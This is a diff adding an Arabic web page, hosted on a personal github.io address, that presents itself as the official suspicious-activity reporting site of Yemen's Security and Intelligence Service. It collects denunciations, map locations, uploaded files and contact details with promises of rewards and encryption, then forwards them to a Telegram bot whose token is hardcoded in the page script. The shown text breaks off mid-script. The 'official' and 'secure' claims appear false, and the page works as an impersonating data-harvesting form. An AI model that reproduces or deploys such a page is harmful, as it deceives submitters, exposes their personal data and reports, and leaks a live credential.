@@ -1,0 +1,804 @@
+<html><head><base href="https://zr0zr0.github.io/R/report">
+<title>صفحة الإبلاغ عن الأنشطة المشبوهة - جهاز الأمن والمخابرات</title>
+<meta charset="UTF-8">
+<meta name="theme-color" content="#042a52">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<link rel="shortcut icon" type="image/x-icon" href="https://i.postimg.cc/FH4srtHr/logo39.png">
+
+<!-- Add Open Graph Meta Tags -->
+<meta property="og:title" content="الإبلاغ عن الأنشطة المشبوهة - جهاز الأمن والمخابرات">
+<meta property="og:description" content="موقع رسمي لجهاز الأمن والمخابرات للإبلاغ عن الأنشطة المشبوهة. ساهم في حماية أمن الوطن.">
+<meta property="og:image" content="https://i.postimg.cc/4y7jt3wD/logo.jpg">
+<meta property="og:url" content="https://zr0zr0.github.io/R/report">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="جهاز الأمن والمخابرات">
+
+<!-- Add Twitter Card Meta Tags -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="الإبلاغ عن الأنشطة المشبوهة - جهاز الأمن والمخابرات">
+<meta name="twitter:description" content="موقع رسمي لجهاز الأمن والمخابرات للإبلاغ عن الأنشطة المشبوهة. ساهم في حماية أمن الوطن.">
+<meta name="twitter:image" content="https://i.postimg.cc/4y7jt3wD/logo.jpg">
+
+<!-- Add additional meta tags for SEO -->
+<meta name="description" content="الموقع الرسمي لجهاز الأمن والمخابرات للإبلاغ عن الأنشطة المشبوهة. ساهم في حماية أمن الوطن وكن جزءًا من جهود مكافحة الجريمة والإرهاب.">
+<meta name="keywords" content="جهاز الأمن والمخابرات, الإبلاغ عن الجرائم, الأمن القومي, مكافحة الإرهاب, اليمن">
+<meta name="author" content="جهاز الأمن والمخابرات">
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdn.jsdelivr.net/npm/leaflet@1.7.1/dist/leaflet.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/leaflet@1.7.1/dist/leaflet.css">
+<script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>
+<link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/shepherd.js@10.0.1/dist/css/shepherd.css"/>
+<script src="https://cdn.jsdelivr.net/npm/shepherd.js@10.0.1/dist/js/shepherd.min.js"></script>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
+  body {
+    font-family: 'Tajawal', sans-serif;
+    direction: rtl;
+  }
+  .bg-navy {
+    background-color: #042a52;
+  }
+  .text-navy {
+    color: #042a52;
+  }
+  .modal {
+    transition: opacity 0.3s ease-in-out, transform 0.3s ease-in-out;
+  }
+  .modal-enter {
+    opacity: 0;
+    transform: translateX(100%);
+  }
+  .modal-enter-active {
+    opacity: 1;
+    transform: translateX(0);
+  }
+  .modal-exit {
+    opacity: 1;
+    transform: translateX(0);
+  }
+  .modal-exit-active {
+    opacity: 0;
+    transform: translateX(100%);
+  }
+  .select2-container {
+    width: 100% !important;
+  }
+  header nav ul {
+    display: flex;
+    align-items: center;
+  }
+  header nav ul li {
+    margin-right: 1rem;
+  }
+  header nav ul li:last-child {
+    margin-right: 0;
+  }
+  header nav ul li a,
+  header nav ul li button {
+    display: flex;
+    align-items: center;
+    padding: 0.5rem;
+    border-radius: 0.25rem;
+    transition: background-color 0.3s ease;
+  }
+  header nav ul li a:hover,
+  header nav ul li button:hover {
+    background-color: rgba(255, 255, 255, 0.1);
+  }
+  header nav ul li svg {
+    margin-left: 0.5rem;
+  }
+  header .flex-col {
+    align-items: center;
+  }
+  @media (max-width: 640px) {
+    .modal-content {
+      width: 90%;
+      max-width: none;
+    }
+  }
+  #welcomeModal .flex-col {
+    align-items: center;
+    z-index: 50;
+  }
+  /* Update modal z-index */
+  #welcomeModal {
+    z-index: 1000 !important;
+  }
+  /* Update map container z-index */
+  #map {
+    z-index: 1 !important;
+  }
+  /* Ensure modal content stays above map */
+  #welcomeModal .modal-content {
+    z-index: 1001 !important;
+    position: relative;
+  }
+  /* Add custom tour styles */
+  .shepherd-theme-custom {
+    direction: rtl;
+    font-family: 'Tajawal', sans-serif;
+  }
+  .shepherd-theme-custom .shepherd-content {
+    max-width: 400px;
+    padding: 0;
+  }
+  .shepherd-theme-custom .shepherd-header {
+    background: #042a52;
+    padding: 1rem;
+  }
+  .shepherd-has-title .shepherd-content .shepherd-header {
+    background:#042a52;
+    padding: 1em;
+  }
+  .shepherd-theme-custom .shepherd-title {
+    color: white;
+    font-size: 1.1em;
+  }
+  .shepherd-theme-custom .shepherd-text {
+    padding: 1rem;
+  }
+  .shepherd-theme-custom .shepherd-footer {
+    padding: 0.5rem;
+  }
+  .shepherd-theme-custom .shepherd-button {
+    background: #042a52;
+    border: none;
+    border-radius: 3px;
+    color: white;
+    cursor: pointer;
+    margin-right: 0.5rem;
+    padding: 0.5rem 1.5rem;
+  }
+  .shepherd-theme-custom .shepherd-button-secondary {
+    background: #6B7280;
+  }
+</style>
+</head>
+<body class="bg-gray-100">
+  <header class="bg-navy text-white p-4">
+    <div class="container mx-auto flex flex-col sm:flex-row justify-between items-center">
+      <div class="flex flex-col items-center mb-4 sm:mb-0">
+        <img src="https://i.postimg.cc/FH4srtHr/logo39.png" alt="شعار جهاز الأمن والمخابرات" class="w-16 h-16 mb-2">
+        <h1 class="text-xl sm:text-2xl font-bold text-center">جهاز الأمن والمخابرات</h1>
+      </div>
+      <nav>
+        <ul class="flex flex-wrap justify-center sm:justify-end space-x-4">
+          <li><a href="#" class="hover:text-gray-300 flex items-center"><svg class="w-5 h-5 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"></path></svg>الرئيسية</a></li>
+          <li><button id="instructionsBtn" class="hover:text-gray-300 flex items-center"><svg class="w-5 h-5 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>التعليمات</button></li>
+          <li><button id="contactBtn" class="hover:text-gray-300 flex items-center"><svg class="w-5 h-5 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg>اتصل بنا</button></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main class="container mx-auto mt-8 p-4 sm:px-6 lg:px-8">
+    <section class="mb-8">
+      <h2 class="text-3xl font-bold mb-4 text-navy">الإبلاغ عن الأنشطة المشبوهة</h2>
+      <p class="text-gray-700 mb-4">نحن نقدر مساهمتكم في الحفاظ على أمن وطننا. يرجى استخدام النموذج أدناه للإبلاغ عن أي نشاط مشبوه قد يهدد الأمن القومي. نؤكد لكم أن جميع المعلومات المقدمة ستعامل بسرية تامة. كما يسرنا إعلامكم أن جهاز الأمن والمخابرات يقدم مكافآت مالية قيمة مقابل المعلومات الهامة والحساسة التي تساهم في حماية أمن الوطن.</p>
+    </section>
+
+    <form id="reportForm" class="bg-white shadow-md rounded px-4 sm:px-8 pt-6 pb-8 mb-4">
+      <div class="mb-4">
+        <label class="block text-gray-700 text-sm font-bold mb-2" for="activityType">
+          نوع النشاط المشبوه
+        </label>
+        <select class="select2 shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="activityType" required>
+          <option value="">اختر نوع النشاط</option>
+          <option value="cyber">نشاط إلكتروني مشبوه</option>
+          <option value="physical">نشاط مادي مشبوه</option>
+          <option value="financial">نشاط مالي مشبوه</option>
+          <option value="social">نشاط اجتماعي مشبوه</option>
+          <option value="espionage">نشاط تجسس</option>
+          <option value="terrorism">نشاط إرهابي</option>
+          <option value="smuggling">تهريب</option>
+          <option value="اجهزة محضوره">اجهزة محظورة</option>
+          <option value="extremism">تطرف فكري</option>
+          <option value="money_laundering">غسيل أموال</option>
+          <option value="other">أخرى</option>
+        </select>
+      </div>
+      <div class="mb-4">
+        <label class="block text-gray-700 text-sm font-bold mb-2" for="description">
+          وصف تفصيلي
+        </label>
+        <textarea class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="description" rows="4" required></textarea>
+      </div>
+      <div class="mb-4">
+        <label class="block text-gray-700 text-sm font-bold mb-2" for="location">
+          الموقع الجغرافي
+        </label>
+        <div class="flex flex-col sm:flex-row mb-2">
+          <input type="text" id="locationSearch" placeholder="ابحث عن موقع" class="shadow appearance-none border rounded w-full sm:w-2/3 py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline mb-2 sm:mb-0 sm:ml-2">
+          <button type="button" id="searchLocation" class="bg-navy hover:bg-blue-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline w-full sm:w-auto">بحث</button>
+        </div>
+        <div id="map" style="height: 300px;" class="w-full"></div>
+        <input type="hidden" id="latitude" name="latitude">
+        <input type="hidden" id="longitude" name="longitude">
+      </div>
+      <div class="mb-4">
+        <label class="block text-gray-700 text-sm font-bold mb-2" for="file">
+          إرفاق ملفات (صور، فيديوهات، وثائق)
+        </label>
+        <input type="file" id="file" name="file" multiple class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline">
+      </div>
+      <div class="mb-4">
+        <label class="block text-gray-700 text-sm font-bold mb-2" for="contact">
+          رقم الهاتف أو البريد الإلكتروني (اختياري)
+        </label>
+        <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="contact" type="text">
+      </div>
+      <div class="flex items-center justify-between">
+        <button class="bg-navy hover:bg-blue-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline" type="submit">
+          إرسال البلاغ
+        </button>
+      </div>
+    </form>
+
+    <section class="text-center py-8 bg-gray-100">
+      <p class="text-xl font-bold text-navy">
+تواصل معنا على الرقم المجاني 100</p>
+    </section>
+  </main>
+
+  <footer class="bg-gray-200 text-center p-4">
+  	<p>جهاز الأمن والمخابرات</p>
+    <p>&copy; 2024 جميع الحقوق محفوظة.</p>
+  </footer>
+
+  <!-- Modal for Instructions and Privacy Policy -->
+  <div id="welcomeModal" class="fixed inset-0 bg-gray-600 bg-opacity-50 overflow-y-auto h-full w-full hidden">
+    <div class="relative top-20 mx-auto p-5 border w-full sm:w-3/4 max-w-2xl shadow-lg rounded-md bg-white modal-content">
+        <div class="flex flex-col items-center mb-4">
+            <img src="https://i.postimg.cc/FH4srtHr/logo39.png" alt="شعار جهاز الأمن والمخابرات" class="w-16 h-16 mb-2">
+            <h2 class="text-xl font-bold text-center">جهاز الأمن والمخابرات</h2>
+        </div>
+        <div class="mt-3">
+            <h3 class="text-lg leading-6 font-medium text-gray-900 text-center">
+                مرحبًا بك في صفحة الإبلاغ عن الأنشطة المشبوهة
+            </h3>
+            <div class="mt-2 px-7 py-3">
+                <h4 class="text-md font-bold mb-2">سياسة الخصوصية</h4>
+                <p class="text-sm text-gray-500 mb-4">
+                    يلتزم جهاز الأمن والمخابرات بحماية خصوصية المستخدمين وضمان سرية المعلومات المقدمة. نضمن لك أن كافة البيانات التي تقدمها عبر هذه الصفحة تُعامل بأقصى درجات السرية والأمان وفق أعلى معايير الحماية التقنية.
+                </p>
+                <h4 class="text-md font-bold mb-2">خصوصية المبلّغ وسلامته القانونية</h4>
+                <ul class="text-sm text-gray-500 list-disc list-inside mb-4">
+                    <li>نؤكد لك أن الإبلاغ عن الأنشطة المشبوهة يتم بسرية تامة ودون أي تبعات قانونية أو ارتباط مباشر بينك وبين البلاغ المقدم.</li>
+                    <li>يتم التعامل مع جميع البلاغات بموضوعية ومهنية تامة، ونضمن لك أن مشاركتك لن تكون محل مساءلة قانونية تحت أي ظرف.</li>
+                    <li>هدفنا الوحيد هو حماية الوطن وضمان سلامة المجتمع، ولن يكون لأي مبلّغ علاقة بأي تحقيقات أو قضايا ناتجة عن البلاغ.</li>
+                </ul>
+                <h4 class="text-md font-bold mb-2">المكافآت والتقدير</h4>
+                <ul class="text-sm text-gray-500 list-disc list-inside mb-4">
+                    <li>نؤمن بأهمية دور المواطن في حماية أمن الوطن، ولذلك نقدم مكافآت مالية سخية للمبلّغين الذين تساهم بلاغاتهم في حماية الأمن العام.</li>
+                    <li>نمنح شهادات تقديرية للمبلّغين تقديرًا لجهودهم الوطنية، ويتم منحها بناءً على رغبة المبلّغ وبسرية تامة.</li>
+                    <li>يمكن للمبلّغ، بشكل اختياري، إدخال بيانات الاتصال مثل رقم الهاتف أو البريد الإلكتروني في الخانة المخصصة، وذلك للتواصل معه في حال الحاجة إلى معلومات إضافية عن البلاغ، أو لتسليمه المكافأة والشهادة التقديرية.</li>
+                </ul>
+                <h4 class="text-md font-bold mb-2">أمان البيانات</h4>
+                <ul class="text-sm text-gray-500 list-disc list-inside mb-4">
+                    <li>جميع الاتصالات عبر الموقع آمنة ومشفرة باستخدام أقوى تقنيات الحماية.</li>
+                    <li>لا يمكن لأي جهة غير مصرح لها الوصول إلى البيانات المقدمة أو الاطلاع عليها.</li>
+                    <li>يتم حذف البيانات غير الضرورية فور انتهاء الغرض الأمني منها لضمان حمايتك بشكل كامل.</li>
+                </ul>
+                <h4 class="text-md font-bold mb-2">التعامل مع الاستخدام غير المشروع</h4>
+                <ul class="text-sm text-gray-500 list-disc list-inside mb-4">
+                    <li>أي تلاعب أو إساءة استخدام لهذه الصفحة أو محاولات لعرقلة الغرض الأمني المخصص لها ستؤدي إلى اتخاذ إجراءات قانونية صارمة وفقًا للقوانين السارية.</li>
+                    <li>نعمل على حماية هذه المنصة بكل الوسائل التقنية والقانونية لضمان استمرارية دورها في تعزيز أمن المجتمع.</li>
+                </ul>
+                <p class="text-sm text-gray-500">
+                    شكرًا لك على مساهمتك في حماية وطننا. نحن نثمّن جهودك ونتعهد بحماية خصوصيتك وأمانك بشكل كامل.
+                </p>
+                <p class="text-sm text-gray-500">
+                    باستخدامك لهذه الصفحة، فإنك توافق على سياسة الخصوصية هذه وعلى معالجة بياناتك وفقًا للأنظمة واللوائح المعمول بها.
+                </p>
+                <div class="mt-4 text-right">
+                    <label class="inline-flex items-center">
+                        <input type="checkbox" id="agreeCheckbox" class="form-checkbox">
+                        <span class="mr-2">أوافق على الشروط والأحكام وسياسة الخصوصية</span>
+                    </label>
+                </div>
+            </div>
+            <div class="items-center px-4 py-3">
+                <button id="continueBtn" class="px-4 py-2 bg-navy text-white text-base font-medium rounded-md w-full shadow-sm hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-300" disabled>
+                    متابعة
+                </button>
+            </div>
+        </div>
+    </div>
+  </div>
+  <!-- Modal for Tour Prompt -->
+  <div id="tourPromptModal" class="fixed inset-0 bg-gray-600 bg-opacity-50 overflow-y-auto h-full w-full hidden">
+    <div class="relative top-20 mx-auto p-5 border w-full sm:w-96 shadow-lg rounded-md bg-white">
+      <div class="mt-3 text-center">
+        <h3 class="text-lg font-medium text-gray-900">هل تريد جولة إرشادية سريعة؟</h3>
+        <div class="mt-4">
+          <p class="text-sm text-gray-500">سنريك كيفية استخدام منصة الإبلاغ خطوة بخطوة</p>
+        </div>
+        <div class="mt-4 flex justify-center space-x-4">
+          <button id="startTourBtn" class="px-4 py-2 bg-navy text-white rounded-md hover:bg-blue-700">نعم، أرني الجولة</button>
+          <button id="skipTourBtn" class="px-4 py-2 bg-gray-200 text-gray-700 rounded-md hover:bg-gray-300">تخطي</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+document.getElementById('skipTourBtn').addEventListener('click', function() {
+    document.getElementById('tourPromptModal').classList.add('hidden');
+});
+  </script>
+
+  <!-- Modal for Instructions -->
+  <div id="instructionsModal" class="fixed inset-0 bg-gray-600 bg-opacity-50 overflow-y-auto h-full w-full hidden modal">
+    <div class="relative top-20 mx-auto p-5 border w-full sm:w-96 shadow-lg rounded-md bg-white modal-content">
+      <div class="mt-3">
+        <h3 class="text-lg leading-6 font-medium text-gray-900 text-center">التعليمات</h3>
+        <div class="mt-2 px-7 py-3">
+          <p class="text-sm text-gray-500">
+            1. املأ جميع الحقول المطلوبة بدقة.<br>
+            2. حدد الموقع على الخريطة.<br>
+            3. أرفق أي ملفات ذات صلة.<br>
+            4. راجع المعلومات قبل الإرسال.<br>
+            5. اضغط على زر "إرسال البلاغ" عند الانتهاء.
+          </p>
+        </div>
+        <div class="items-center px-4 py-3">
+          <button id="instructionsCloseBtn" class="px-4 py-2 bg-navy text-white text-base font-medium rounded-md w-full shadow-sm hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-300">
+            حسناً
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal for Contact -->
+  <div id="contactModal" class="fixed inset-0 bg-gray-600 bg-opacity-50 overflow-y-auto h-full w-full hidden modal">
+    <div class="relative top-20 mx-auto p-5 border w-full sm:w-96 shadow-lg rounded-md bg-white modal-content">
+      <div class="mt-3">
+      	<div class="mb-8">
+        <div class="w-32 h-32 mx-auto bg-red-600 rounded-full flex items-center justify-center pulse">
+          <svg class="w-16 h-16 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"></path>
+          </svg>
+        </div>
+      </div>
+        <h3 class="text-lg leading-6 font-medium text-gray-900 text-center">اتصل بنا</h3>
+        
+        <div class="mt-2 px-7 py-3">
+          <p class="text-sm text-gray-500 mb-4">
+            <strong class="text-red-600">تنبيه هام:</strong> يرجى الاتصال فقط في الحالات الطارئة. أي استخدام غير مسؤول لخط الطوارئ قد يعرضك للمساءلة القانونية.
+          </p>
+          <p class="text-sm text-gray-500">
+            للحالات الطارئة: <strong class="text-red-600">100</strong>
+          </p>
+        </div>
+        <div class="items-center px-4 py-3">
+          <a href="tel:100" class="px-4 py-2 bg-red-500 text-white text-base font-medium rounded-md w-full shadow-sm hover:bg-red-600 focus:outline-none focus:ring-2 focus:ring-red-300 block text-center mb-2 flex items-center justify-center">
+            <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"></path></svg>
+            اتصال طارئ
+          </a>
+          <button id="contactCloseBtn" class="px-4 py-2 bg-navy text-white text-base font-medium rounded-md w-full shadow-sm hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-300">
+            إغلاق
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <script>
+    $(document).ready(function() {
+      // Initialize Select2
+      $('.select2').select2();
+      
+      // Initialize map
+      var map = L.map('map', {
+        scrollWheelZoom: false
+      }).setView([15.5527, 48.5164], 6); // Coordinates for Yemen with a zoom level of 6
+
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
+      }).addTo(map);
+
+      var marker;
+
+      map.on('click', function(e) {
+        if (marker) {
+          map.removeLayer(marker);
+        }
+        marker = L.marker(e.latlng).addTo(map);
+        document.getElementById('latitude').value = e.latlng.lat;
+        document.getElementById('longitude').value = e.latlng.lng;
+      });
+
+      // Add global error handler
+      window.addEventListener('unhandledrejection', function(event) {
+        console.error('Unhandled promise rejection:', event.reason);
+        Swal.fire({
+          title: 'خطأ',
+          text: 'حدث خطأ غير متوقع. يرجى المحاولة مرة أخرى لاحقاً.',
+          icon: 'error',
+          confirmButtonText: 'حسناً'
+        });
+      });
+
+      // Modify the location search function to use try-catch
+      document.getElementById('searchLocation').addEventListener('click', async function() {
+        var query = document.getElementById('locationSearch').value;
+        try {
+          const response = await fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(query)}`);
+          const data = await response.json();
+          if (data.length > 0) {
+            var lat = parseFloat(data[0].lat);
+            var lon = parseFloat(data[0].lon);
+            map.setView([lat, lon], 13);
+            if (marker) {
+              map.removeLayer(marker);
+            }
+            marker = L.marker([lat, lon]).addTo(map);
+            document.getElementById('latitude').value = lat;
+            document.getElementById('longitude').value = lon;
+          } else {
+            Swal.fire({
+              title: 'خطأ',
+              text: 'لم يتم العثور على الموقع',
+              icon: 'error',
+              confirmButtonText: 'حسناً'
+            });
+          }
+        } catch (error) {
+          console.error('Error:', error);
+          Swal.fire({
+            title: 'خطأ',
+            text: 'حدث خطأ أثناء البحث عن الموقع',
+            icon: 'error',
+            confirmButtonText: 'حسناً'
+          });
+        }
+      });
+
+      // Form submission
+      document.getElementById('reportForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        // Gather form data
+        var formData = new FormData();
+        formData.append('activityType', document.getElementById('activityType').value);
+        formData.append('description', document.getElementById('description').value);
+        formData.append('latitude', document.getElementById('latitude').value);
+        formData.append('longitude', document.getElementById('longitude').value);
+        formData.append('contact', document.getElementById('contact').value);
+
+        var files = document.getElementById('file').files;
+
+        // Send data to Telegram bot
+        var botToken = '7192691157:AAGW2m0he1IZAxF1l3mPXBmIHC6GwUsgVqk';
+        var chatId = '6526965796';
+        var lat = formData.get('latitude');
+        var lon = formData.get('longitude');
+        var googleEarthLink = `https://earth.google.com/web/search/${lat},${lon}`;
+        var text = 'نوع النشاط: ' + formData.get('activityType') + '\n' +
+                   'الوصف: ' + formData.get('description') + '\n' +
+                   'الموقع: ' + googleEarthLink + '\n' +
+                   'معلومات الاتصال: ' + formData.get('contact');
+
+        // Show loading indicator
+        Swal.fire({
+          title: 'جاري الإرسال',
+          html: 'يرجى الانتظار...',
+          allowOutsideClick: false,
+          didOpen: () => {
+            Swal.showLoading();
+          }
+        });
+
+        // Send text message
+        fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: text,
+          })
+        })
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            // Send files one by one
+            let filePromises = Array.from(files).map(file => 
+              sendFileToTelegram(botToken, chatId, file)
+            );
+
+            Promise.all(filePromises)
+              .then(() => {
+                Swal.fire({
+                  title: 'تم الإرسال',
+                  text: 'تم إرسال البلاغ والملفات بنجاح. شكرًا لمساهمتكم في الحفاظ على أمن الوطن.',
+                  icon: 'success',
+                  confirmButtonText: 'حسناً'
+                });
+                document.getElementById('reportForm').reset();
+                if (marker) {
+                  map.removeLayer(marker);
+                }
+              })
+              .catch(error => {
+                console.error('Error sending files:', error);
+                Swal.fire({
+                  title: 'تحذير',
+                  text: 'تم إرسال البلاغ بنجاح، ولكن حدث خطأ أثناء إرسال بعض الملفات.',
+                  icon: 'warning',
+                  confirmButtonText: 'حسناً'
+                });
+              });
+          } else {
+            Swal.fire({
+              title: 'خطأ',
+              text: 'حدث خطأ أثناء إرسال البلاغ. يرجى المحاولة مرة أخرى لاحقاً.',
+              icon: 'error',
+              confirmButtonText: 'حسناً'
+            });
+          }
+        })
+        .catch((error) => {
+          console.error('Error:', error);
+          Swal.fire({
+            title: 'خطأ',
+            text: 'حدث خطأ أثناء إرسال البلاغ. يرجى المحاولة مرة أخرى لاحقاً.',
+            icon: 'error',
+            confirmButtonText: 'حسناً'
+          });
+        });
+      });
+
+      // Function to send files to Telegram
+      function sendFileToTelegram(botToken, chatId, file) {
+        let formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('document', file);
+
+        return fetch('https://api.telegram.org/bot' + botToken + '/sendDocument', {
+          method: 'POST',
+          body: formData
+        })
+        .then(response => response.json())
+        .then(result => {
+          if (!result.ok) {
+            throw new Error('Failed to send file: ' + file.name);
+          }
+        });
+      }
+
+      // Welcome Modal
+      window.addEventListener('load', function() {
+        document.getElementById('welcomeModal').classList.remove('hidden');
+      });
+
+      document.getElementById('agreeCheckbox').addEventListener('change', function() {
+        document.getElementById('continueBtn').disabled = !this.checked;
+      });
+
+      document.getElementById('continueBtn').addEventListener('click', function() {
+        document.getElementById('welcomeModal').classList.add('hidden');
+        document.getElementById('tourPromptModal').classList.remove('hidden');
+      });
+
+      // Add tour initialization code
+      function initTour() {
+        const tour = new Shepherd.Tour({
+          defaultStepOptions: {
+            cancelIcon: {
+              enabled: true
+            },
+            classes: 'shepherd-theme-custom',
+            scrollTo: true
+          }
+        });
+
+        // Add steps to tour
+        tour.addStep({
+          id: 'activity-type',
+          title: 'نوع النشاط المشبوه',
+          text: 'اختر نوع النشاط المشبوه من القائمة المنسدلة. يمكنك اختيار الفئة الأنسب للنشاط الذي تريد الإبلاغ عنه.',
+          attachTo: {
+            element: '#activityType',
+            on: 'bottom'
+          },
+          buttons: [
+            {
+              text: 'التالي',
+              action: () => tour.next()
+            }
+          ]
+        });
+
+        tour.addStep({
+          id: 'description',
+          title: 'وصف تفصيلي',
+          text: 'قم بكتابة وصف تفصيلي للنشاط المشبوه. كلما كانت التفاصيل أكثر دقة، كلما كان ذلك أفضل.',
+          attachTo: {
+            element: '#description',
+            on: 'bottom'
+          },
+          buttons: [
+            {
+              text: 'السابق',
+              action: () => tour.back(),
+              classes: 'shepherd-button-secondary'
+            },
+            {
+              text: 'التالي',
+              action: () => tour.next()
+            }
+          ]
+        });
+
+        tour.addStep({
+          id: 'location-search',
+          title: 'تحديد الموقع',
+          text: 'اكتب اسم المدينة أو الحي أو الشارع ثم اضغط على زر البحث. يمكنك أيضاً النقر مباشرة على الخريطة لتحديد الموقع بدقة.',
+          attachTo: {
+            element: '#locationSearch',
+            on: 'bottom'
+          },
+          buttons: [
+            {
+              text: 'السابق',
+              action: () => tour.back(),
+              classes: 'shepherd-button-secondary'
+            },
+            {
+              text: 'التالي',
+              action: () => tour.next()
+            }
+          ]
+        });
+
+        tour.addStep({
+          id: 'file-upload',
+          title: 'إرفاق الملفات',
+          text: 'يمكنك إرفاق صور أو فيديوهات أو مستندات تتعلق بالبلاغ. هذا سيساعد في توثيق النشاط المشبوه.',
+          attachTo: {
+            element: '#file',
+            on: 'bottom'
+          },
+          buttons: [
+            {
+              text: 'السابق',
+              action: () => tour.back(),
+              classes: 'shepherd-button-secondary'
+            },
+            {
+              text: 'التالي',
+              action: () => tour.next()
+            }
+          ]
+        });
+
+        tour.addStep({
+          id: 'contact',
+          title: 'معلومات الاتصال (اختياري)',
+          text: 'يمكنك تقديم رقم هاتفك أو بريدك الإلكتروني إذا كنت ترغب في ذلك. هذا سيمكننا من التواصل معك للحصول على مزيد من المعلومات أو لتقديم مكافأة.',
+          attachTo: {
+            element: '#contact',
+            on: 'bottom'
+          },
+          buttons: [
+            {
+              text: 'السابق',
+              action: () => tour.back(),
+              classes: 'shepherd-button-secondary'
+            },
+            {
+              text: 'التالي',
+              action: () => tour.next()
+            }
+          ]
+        });
+
+        tour.addStep({
+          id: 'submit-button',
+          title: 'زر إرسال البلاغ',
+          text: 'عند الانتهاء من إدخال جميع المعلومات المطلوبة، اضغط على زر "إرسال البلاغ" لإرسال المعلومات بشكل آمن ومشفّر إلى جهاز الأمن.',
+          attachTo: {
+            element: 'button[type="submit"]',
+            on: 'top'
+          },
+          buttons: [
+            {
+              text: 'السابق',
+              action: () => tour.back(),
+              classes: 'shepherd-button-secondary'
+            },
+            {
+              text: 'التالي',
+              action: () => tour.next()
+            }
+          ]
+        });
+
+        tour.addStep({
+          id: 'emergency-number',
+          title: 'رقم الاتصال المجاني',
+          text: 'يمكنك الاتصال بنا مجانًا على الرقم الموضح للحصول على مزيد من المعلومات أو لتقديم البلاغات عبر الهاتف.',
+          attachTo: {
+            element: 'section.text-center.py-8',
+            on: 'top'
+          },
+          buttons: [
+            {
+              text: 'السابق',
+              action: () => tour.back(),
+              classes: 'shepherd-button-secondary'
+            },
+            {
+              text: 'إنهاء',
+              action: () => tour.complete()
+            }
+          ]
+        });
+
+        return tour;
+      }
+
+      // Update the tour start button handler
+      document.getElementById('startTourBtn').addEventListener('click', function() {
+        document.getElementById('tourPromptModal').classList.add('hidden');
+        initTour().start();
+      });
+
+      // Instructions Modal
+      document.getElementById('instructionsBtn').addEventListener('click', function() {
